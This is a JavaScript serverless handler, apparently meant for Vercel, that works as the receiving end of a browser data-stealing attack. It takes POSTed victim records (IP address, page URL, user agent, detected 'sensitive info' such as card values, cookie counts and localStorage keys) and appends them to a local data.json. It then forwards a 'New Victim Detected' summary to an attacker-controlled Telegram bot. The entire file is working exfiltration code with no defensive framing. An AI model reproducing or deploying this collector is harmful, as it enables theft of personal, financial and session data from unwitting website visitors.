import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// ES Module equivalents for __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Telegram Config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn("⚠️ Telegram config missing");
        return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // Format Message
    let msg = `🔓 *New Victim Detected*\n\n`;
    msg += `🆔 *IP:* \`${data.ip || 'Unknown'}\`\n`;
    msg += `🌐 *URL:* ${data.url || 'N/A'}\n`;
    
    const ua = data.userAgent ? data.userAgent.substring(0, 50) : 'N/A';
    msg += `🖥️ *UA:* \`${ua}...\`\n`;
    
    if (data.sensitiveInfo && Array.isArray(data.sensitiveInfo) && data.sensitiveInfo.length > 0) {
        msg += `\n💳 *Sensitive Info Found:*\n`;
        data.sensitiveInfo.forEach(item => {
            msg += `• ${item.type}: \`${item.value}\`\n`;
        });
    } else {
        msg += `\n💳 *Sensitive Info:* None detected.`;
    }

    const cookieCount = data.cookies ? data.cookies.split(';').filter(c => c.trim()).length : 0;
    msg += `\n🍪 *Cookies:* ${cookieCount} found`;
    
    const storageKeys = Object.keys(data.storage?.localStorage || {}).join(', ');
    msg += `\n💾 *Local Storage Keys:* ${storageKeys || 'None'}`;

    try {
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: msg,
                parse_mode: 'Markdown'
            })
        }).catch(err => console.error("❌ Telegram Fetch Error:", err));
    } catch (err) {
        console.error("❌ Telegram Send Error:", err);
    }
}

export default async function handler(req, res) {
    // 1. Log every request to debug
    console.log(`🚀 Incoming Request: Method=${req.method}, URL=${req.url}`);

    if (req.method !== 'POST') {
        console.log("❌ Method Not Allowed");
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    try {
        // 2. Parse Body safely
        let data;
        try {
            data = req.body;
            if (!data) {
                throw new Error("Request body is empty");
            }
        } catch (e) {
            throw new Error(`Failed to parse body: ${e.message}`);
        }

        console.log("✅ Data received:", JSON.stringify(data).substring(0, 100) + "...");

        // 3. Save to local JSON file (for debugging/verification)
        try {
            const filePath = path.join(__dirname, '..', 'data.json');
            let existingData = [];
            
            if (fs.existsSync(filePath)) {
                try { 
                    const content = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(content);
                } catch (e) { 
                    console.error("Error reading data.json", e);
                }
            }
            
            if (!Array.isArray(existingData)) existingData = [];
            existingData.push(data);
            fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
            console.log("💾 Saved to data.json");
        } catch (e) {
            console.warn("⚠️ Failed to save to file:", e.message);
        }

        // 4. Send to Telegram
        sendToTelegram(data);

        console.log("✅ Success");
        res.status(200).json({ status: 'ok' });

    } catch (error) {
        // 5. This error WILL show up in your Vercel Logs
        console.error("💥 Handler Crash:", error);
        res.status(500).json({ 
            error: 'Internal Server Error', 
            details: error.message 
        });
    }
}
